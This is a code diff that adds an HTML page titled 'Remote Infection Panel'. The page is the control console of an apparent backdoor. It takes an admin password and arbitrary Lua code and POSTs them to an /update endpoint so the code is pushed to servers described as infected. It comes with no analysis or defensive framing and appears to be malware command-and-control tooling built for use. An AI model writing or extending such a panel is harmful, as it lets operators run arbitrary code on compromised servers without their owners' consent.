@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Infection Panel</title>
+    <style>
+        body { background: #111; color: #ff0000; font-family: monospace; text-align: center; }
+        textarea { width: 80%; height: 200px; background: #000; color: #00ff00; border: 1px solid #ff0000; }
+        input { margin: 10px; padding: 5px; }
+        button { padding: 10px 20px; cursor: pointer; background: #ff0000; color: white; border: none; }
+    </style>
+</head>
+<body>
+    <h1>REMOTE INFECTION PANEL</h1>
+    <input type="password" id="pass" placeholder="Admin Password"><br>
+    <textarea id="lua" placeholder="print('Infected!')"></textarea><br>
+    <button onclick="send()">PUSH TO SERVERS</button>
+
+    <script>
+        async function send() {
+            const code = document.getElementById('lua').value;
+            const pass = document.getElementById('pass').value;
+            await fetch('/update', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ code: code, password: pass })
+            });
+            alert("Sent to Render!");
+        }
+    </script>
+</body>
+</html>
